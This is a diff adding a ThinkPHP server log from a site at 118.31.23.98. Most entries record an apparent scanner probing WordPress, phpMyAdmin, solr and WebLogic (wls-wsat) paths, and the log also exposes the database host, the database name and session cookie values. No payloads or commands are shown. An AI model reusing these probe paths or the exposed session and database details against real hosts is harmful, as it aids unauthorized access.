+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'referer' => 'http://118.31.23.98/license.txt',
+  'cookie' => 'PHPSESSID=hua633vh57ugt5bsu2vj7jpm73',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-04-15T06:52:09+08:00 ] 172.16.252.49 47.97.62.186 GET /wp-includes/js/wplink.js
+[ log ] 118.31.23.98/wp-includes/js/wplink.js [运行时间：0.003506s][吞吐率：285.23req/s] [内存消耗：315.36kb] [文件加载：27]
+[ info ] [ LANG ] /var/www/sea/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'wp-includes',
+    1 => 'js',
+    2 => 'wplink.js',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '118.31.23.98',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+  'connection' => 'keep-alive',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'referer' => 'http://118.31.23.98/wp-includes/js/wplink.js',
+  'cookie' => 'PHPSESSID=hua633vh57ugt5bsu2vj7jpm73',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-04-15T06:52:09+08:00 ] 172.16.252.49 47.97.62.186 GET /wp-admin/js/customize-controls.js
+[ log ] 118.31.23.98/wp-admin/js/customize-controls.js [运行时间：0.003627s][吞吐率：275.71req/s] [内存消耗：315.36kb] [文件加载：27]
+[ info ] [ LANG ] /var/www/sea/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'wp-admin',
+    1 => 'js',
+    2 => 'customize-controls.js',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '118.31.23.98',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+  'connection' => 'keep-alive',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'referer' => 'http://118.31.23.98/wp-admin/js/customize-controls.js',
+  'cookie' => 'PHPSESSID=hua633vh57ugt5bsu2vj7jpm73',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-04-15T06:52:09+08:00 ] 172.16.252.49 47.97.62.186 GET /wp-admin/js/nav-menu.js
+[ log ] 118.31.23.98/wp-admin/js/nav-menu.js [运行时间：0.003561s][吞吐率：280.82req/s] [内存消耗：315.34kb] [文件加载：27]
+[ info ] [ LANG ] /var/www/sea/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'wp-admin',
+    1 => 'js',
+    2 => 'nav-menu.js',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '118.31.23.98',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+  'connection' => 'keep-alive',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'referer' => 'http://118.31.23.98/wp-admin/js/nav-menu.js',
+  'cookie' => 'PHPSESSID=hua633vh57ugt5bsu2vj7jpm73',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-04-15T06:52:09+08:00 ] 172.16.252.49 47.97.62.186 GET /wp-includes/js/plupload/handlers.js
+[ log ] 118.31.23.98/wp-includes/js/plupload/handlers.js [运行时间：0.003559s][吞吐率：280.99req/s] [内存消耗：315.41kb] [文件加载：27]
+[ info ] [ LANG ] /var/www/sea/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'wp-includes',
+    1 => 'js',
+    2 => 'plupload',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '118.31.23.98',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+  'connection' => 'keep-alive',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'referer' => 'http://118.31.23.98/wp-includes/js/plupload/handlers.js',
+  'cookie' => 'PHPSESSID=hua633vh57ugt5bsu2vj7jpm73',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-04-15T06:52:10+08:00 ] 172.16.252.49 47.97.62.186 GET /wp-includes/js/tinymce/wp-tinymce.js.gz
+[ log ] 118.31.23.98/wp-includes/js/tinymce/wp-tinymce.js.gz [运行时间：0.003519s][吞吐率：284.17req/s] [内存消耗：315.43kb] [文件加载：27]
+[ info ] [ LANG ] /var/www/sea/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'wp-includes',
+    1 => 'js',
+    2 => 'tinymce',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '118.31.23.98',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+  'connection' => 'keep-alive',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'referer' => 'http://118.31.23.98/wp-includes/js/tinymce/wp-tinymce.js.gz',
+  'cookie' => 'PHPSESSID=hua633vh57ugt5bsu2vj7jpm73',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-04-15T06:52:10+08:00 ] 172.16.252.49 47.97.62.186 GET /README
+[ log ] 118.31.23.98/README [运行时间：0.003542s][吞吐率：282.33req/s] [内存消耗：315.19kb] [文件加载：27]
+[ info ] [ LANG ] /var/www/sea/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'README',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '118.31.23.98',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+  'connection' => 'keep-alive',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'referer' => 'http://118.31.23.98/README',
+  'cookie' => 'PHPSESSID=hua633vh57ugt5bsu2vj7jpm73',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-04-15T06:52:11+08:00 ] 172.16.252.49 47.97.62.186 GET /robots.txt
+[ log ] 118.31.23.98/robots.txt [运行时间：0.003653s][吞吐率：273.74req/s] [内存消耗：315.22kb] [文件加载：27]
+[ info ] [ LANG ] /var/www/sea/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'robots.txt',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '118.31.23.98',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+  'connection' => 'keep-alive',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'referer' => 'http://118.31.23.98/robots.txt',
+  'cookie' => 'PHPSESSID=hua633vh57ugt5bsu2vj7jpm73',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-04-15T06:52:12+08:00 ] 172.16.252.49 47.97.62.186 GET /static/.gitignore
+[ log ] 118.31.23.98/static/.gitignore [运行时间：0.003580s][吞吐率：279.34req/s] [内存消耗：315.29kb] [文件加载：27]
+[ info ] [ LANG ] /var/www/sea/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'static',
+    1 => '.gitignore',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '118.31.23.98',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+  'connection' => 'keep-alive',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'referer' => 'http://118.31.23.98/static/.gitignore',
+  'cookie' => 'PHPSESSID=hua633vh57ugt5bsu2vj7jpm73',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-04-15T06:52:12+08:00 ] 172.16.252.49 47.97.62.186 GET /4e5e5d7364f443e28fbf0d3ae744a59a
+[ log ] 118.31.23.98/4e5e5d7364f443e28fbf0d3ae744a59a [运行时间：0.003600s][吞吐率：277.77req/s] [内存消耗：315.35kb] [文件加载：27]
+[ info ] [ LANG ] /var/www/sea/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '4e5e5d7364f443e28fbf0d3ae744a59a',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '118.31.23.98',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+  'connection' => 'keep-alive',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'referer' => 'http://118.31.23.98/4e5e5d7364f443e28fbf0d3ae744a59a',
+  'cookie' => 'PHPSESSID=hua633vh57ugt5bsu2vj7jpm73',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-04-15T06:52:12+08:00 ] 172.16.252.49 47.97.62.186 GET /?c=4e5e5d7364f443e28fbf0d3ae744a59a
+[ log ] 118.31.23.98/?c=4e5e5d7364f443e28fbf0d3ae744a59a [运行时间：0.019256s][吞吐率：51.93req/s] [内存消耗：478.93kb] [文件加载：41]
+[ info ] [ LANG ] /var/www/sea/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'sea',
+    1 => 'index',
+    2 => 'index',
+  ),
+  'convert' => false,
+)
+[ info ] [ HEADER ] array (
+  'host' => '118.31.23.98',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+  'connection' => 'keep-alive',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'referer' => 'http://118.31.23.98/?c=4e5e5d7364f443e28fbf0d3ae744a59a',
+  'cookie' => 'PHPSESSID=hua633vh57ugt5bsu2vj7jpm73',
+)
+[ info ] [ PARAM ] array (
+  'c' => '4e5e5d7364f443e28fbf0d3ae744a59a',
+)
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'sea',
+  'type' => 'driver\\session\\Mysql',
+  'auto_start' => true,
+  'table_name' => 's_session',
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.012021s ] mysql:dbname=yuhal;host=118.31.23.98;port=3306;charset=utf8
+[ sql ] [ SQL ] SELECT session_data FROM yh_s_session WHERE session_id = 'think_hua633vh57ugt5bsu2vj7jpm73' AND session_expire > '1523746332' [ RunTime:0.002912s ]
+
+---------------------------------------------------------------
+[ 2018-04-15T06:52:12+08:00 ] 172.16.252.49 47.97.62.186 GET /login.html
+[ log ] 118.31.23.98/login.html [运行时间：0.004972s][吞吐率：201.13req/s] [内存消耗：479.17kb] [文件加载：41]
+[ info ] [ LANG ] /var/www/sea/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'sea',
+    1 => 'login',
+    2 => 'index',
+  ),
+  'convert' => false,
+)
+[ info ] [ HEADER ] array (
+  'host' => '118.31.23.98',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+  'connection' => 'keep-alive',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'referer' => 'http://118.31.23.98/?c=4e5e5d7364f443e28fbf0d3ae744a59a',
+  'cookie' => 'PHPSESSID=hua633vh57ugt5bsu2vj7jpm73',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\sea\controller\Login->index[ /var/www/sea/application/sea/controller/Login.php ]
+[ info ] [ VIEW ] /var/www/sea/application/sea/view/page/login.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-04-15T06:52:13+08:00 ] 172.16.252.49 47.97.62.186 GET /index.php/explicit_not_exist_path
+[ log ] 118.31.23.98/index.php/explicit_not_exist_path [运行时间：0.003636s][吞吐率：275.02req/s] [内存消耗：310.15kb] [文件加载：27]
+[ info ] [ LANG ] /var/www/sea/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'explicit_not_exist_path',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '118.31.23.98',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+  'connection' => 'keep-alive',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'referer' => 'http://118.31.23.98/index.php/explicit_not_exist_path',
+  'cookie' => 'PHPSESSID=hua633vh57ugt5bsu2vj7jpm73',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-04-15T06:52:15+08:00 ] 172.16.252.49 47.97.62.186 GET /login.html?c=4e5e5d7364f443e28fbf0d3ae744a59a
+[ log ] 118.31.23.98/login.html?c=4e5e5d7364f443e28fbf0d3ae744a59a [运行时间：0.004517s][吞吐率：221.39req/s] [内存消耗：479.89kb] [文件加载：41]
+[ info ] [ LANG ] /var/www/sea/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'sea',
+    1 => 'login',
+    2 => 'index',
+  ),
+  'convert' => false,
+)
+[ info ] [ HEADER ] array (
+  'host' => '118.31.23.98',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+  'connection' => 'keep-alive',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'referer' => 'http://118.31.23.98/login.html?c=4e5e5d7364f443e28fbf0d3ae744a59a',
+  'cookie' => 'PHPSESSID=hua633vh57ugt5bsu2vj7jpm73',
+)
+[ info ] [ PARAM ] array (
+  'c' => '4e5e5d7364f443e28fbf0d3ae744a59a',
+)
+[ info ] [ RUN ] app\sea\controller\Login->index[ /var/www/sea/application/sea/controller/Login.php ]
+[ info ] [ VIEW ] /var/www/sea/application/sea/view/page/login.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-04-15T06:52:16+08:00 ] 172.16.252.49 47.97.62.186 GET /phpMyAdmin/
+[ log ] 118.31.23.98/phpMyAdmin/ [运行时间：0.003562s][吞吐率：280.74req/s] [内存消耗：315.23kb] [文件加载：27]
+[ info ] [ LANG ] /var/www/sea/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'phpMyAdmin',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '118.31.23.98',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+  'connection' => 'keep-alive',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'referer' => 'http://118.31.23.98/phpMyAdmin/',
+  'cookie' => 'PHPSESSID=hua633vh57ugt5bsu2vj7jpm73',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-04-15T06:52:16+08:00 ] 172.16.252.49 47.97.62.186 GET /phpmyadmin/
+[ log ] 118.31.23.98/phpmyadmin/ [运行时间：0.003513s][吞吐率：284.67req/s] [内存消耗：315.23kb] [文件加载：27]
+[ info ] [ LANG ] /var/www/sea/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'phpmyadmin',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '118.31.23.98',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+  'connection' => 'keep-alive',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'referer' => 'http://118.31.23.98/phpmyadmin/',
+  'cookie' => 'PHPSESSID=hua633vh57ugt5bsu2vj7jpm73',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-04-15T06:52:16+08:00 ] 172.16.252.49 47.97.62.186 GET /pma/
+[ log ] 118.31.23.98/pma/ [运行时间：0.003981s][吞吐率：251.19req/s] [内存消耗：315.18kb] [文件加载：27]
+[ info ] [ LANG ] /var/www/sea/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'pma',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '118.31.23.98',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+  'connection' => 'keep-alive',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'referer' => 'http://118.31.23.98/pma/',
+  'cookie' => 'PHPSESSID=hua633vh57ugt5bsu2vj7jpm73',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-04-15T06:52:17+08:00 ] 172.16.252.49 47.97.62.186 GET /solr/
+[ log ] 118.31.23.98/solr/ [运行时间：0.003566s][吞吐率：280.42req/s] [内存消耗：315.18kb] [文件加载：27]
+[ info ] [ LANG ] /var/www/sea/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'solr',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '118.31.23.98',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+  'connection' => 'keep-alive',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'referer' => 'http://118.31.23.98/solr/',
+  'cookie' => 'PHPSESSID=hua633vh57ugt5bsu2vj7jpm73',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-04-15T06:52:17+08:00 ] 172.16.252.49 47.97.62.186 GET /wcm/
+[ log ] 118.31.23.98/wcm/ [运行时间：0.003586s][吞吐率：278.86req/s] [内存消耗：315.18kb] [文件加载：27]
+[ info ] [ LANG ] /var/www/sea/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'wcm',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '118.31.23.98',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+  'connection' => 'keep-alive',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'referer' => 'http://118.31.23.98/wcm/',
+  'cookie' => 'PHPSESSID=hua633vh57ugt5bsu2vj7jpm73',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-04-15T07:48:25+08:00 ] 172.16.252.49 218.76.66.44 PROPFIND /
+[ log ] localhost/ [运行时间：0.003697s][吞吐率：270.48req/s] [内存消耗：311.68kb] [文件加载：28]
+[ info ] [ LANG ] /var/www/sea/thinkphp/lang/zh-cn.php
+[ info ] [ LOG ] INIT File
+[ error ] [8]未定义数组索引: propfind[/var/www/sea/thinkphp/library/think/Route.php:844]
+
+---------------------------------------------------------------
+[ 2018-04-15T07:48:28+08:00 ] 172.16.252.49 218.76.66.44 POST /wls-wsat/CoordinatorPortType
+[ log ] 118.31.23.98:80/wls-wsat/CoordinatorPortType [运行时间：0.003783s][吞吐率：264.34req/s] [内存消耗：315.55kb] [文件加载：27]
+[ info ] [ LANG ] /var/www/sea/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'wls-wsat',
+    1 => 'CoordinatorPortType',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '118.31.23.98:80',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.0',
+  'connection' => 'Close',
+  'content-type' => 'text/xml',
+  'content-length' => '1214',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-04-15T08:55:34+08:00 ] 172.16.252.49 190.94.148.114 GET /
+[ log ] 118.31.23.98/ [运行时间：0.008631s][吞吐率：115.86req/s] [内存消耗：477.28kb] [文件加载：41]
+[ info ] [ LANG ] /var/www/sea/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'sea',
+    1 => 'index',
+    2 => 'index',
+  ),
+  'convert' => false,
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'Keep-Alive',
+  'keep-alive' => '300',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
+  'host' => '118.31.23.98',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'sea',
+  'type' => 'driver\\session\\Mysql',
+  'auto_start' => true,
+  'table_name' => 's_session',
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.002583s ] mysql:dbname=yuhal;host=118.31.23.98;port=3306;charset=utf8
+[ sql ] [ SQL ] SELECT session_data FROM yh_s_session WHERE session_id = 'think_6ebc5c39dnuukq39g9gak545c4' AND session_expire > '1523753734' [ RunTime:0.001842s ]
+
+---------------------------------------------------------------
+[ 2018-04-15T08:55:35+08:00 ] 172.16.252.49 190.94.148.114 GET /
+[ log ] 118.31.23.98/ [运行时间：0.008949s][吞吐率：111.74req/s] [内存消耗：477.27kb] [文件加载：41]
+[ info ] [ LANG ] /var/www/sea/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'sea',
+    1 => 'index',
+    2 => 'index',
+  ),
+  'convert' => false,
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'Keep-Alive',
+  'keep-alive' => '300',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
+  'host' => '118.31.23.98',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'sea',
+  'type' => 'driver\\session\\Mysql',
+  'auto_start' => true,
+  'table_name' => 's_session',
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.002774s ] mysql:dbname=yuhal;host=118.31.23.98;port=3306;charset=utf8
+[ sql ] [ SQL ] SELECT session_data FROM yh_s_session WHERE session_id = 'think_5hgdejfgjmnplg9c9m1fk7r7i0' AND session_expire > '1523753735' [ RunTime:0.002098s ]
+
+---------------------------------------------------------------
+[ 2018-04-15T08:55:36+08:00 ] 172.16.252.49 190.94.148.114 GET /
+[ log ] 118.31.23.98/ [运行时间：0.011262s][吞吐率：88.79req/s] [内存消耗：477.27kb] [文件加载：41]
+[ info ] [ LANG ] /var/www/sea/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'sea',
+    1 => 'index',
+    2 => 'index',
+  ),
+  'convert' => false,
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'Keep-Alive',
+  'keep-alive' => '300',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
+  'host' => '118.31.23.98',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'sea',
+  'type' => 'driver\\session\\Mysql',
+  'auto_start' => true,
+  'table_name' => 's_session',
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.003910s ] mysql:dbname=yuhal;host=118.31.23.98;port=3306;charset=utf8
+[ sql ] [ SQL ] SELECT session_data FROM yh_s_session WHERE session_id = 'think_eccucpd3ncshsup2jimtu0i7l0' AND session_expire > '1523753736' [ RunTime:0.002768s ]
+
+---------------------------------------------------------------
+[ 2018-04-15T10:50:42+08:00 ] 172.16.252.49 106.11.227.120 GET /
+[ log ] sea.yuhal.com/ [运行时间：0.011759s][吞吐率：85.04req/s] [内存消耗：478.05kb] [文件加载：41]
+[ info ] [ LANG ] /var/www/sea/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'sea',
+    1 => 'index',
+    2 => 'index',
+  ),
+  'convert' => false,
+)
